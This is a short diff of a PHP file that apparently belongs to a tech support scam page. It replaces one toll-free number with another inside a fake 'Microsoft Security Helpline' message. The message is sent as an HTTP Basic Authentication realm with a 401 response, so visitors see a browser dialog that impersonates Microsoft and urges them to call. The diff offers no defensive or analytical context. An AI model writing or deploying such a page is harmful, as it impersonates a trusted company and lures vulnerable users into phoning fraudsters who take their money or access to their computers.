@@ -14,7 +14,7 @@
             exit;
         } else {
 
-          header('WWW-Authenticate: Basic realm="Microsoft Security Helpline +1-888-971-5620 (Toll Free)."');
+          header('WWW-Authenticate: Basic realm="Microsoft Security Helpline +1-833-931-1547 (Toll Free)."');
           header('HTTP/1.0 401 Unauthorized');
 $page = $_SERVER['PHP_SELF'];
 $sec = "0";
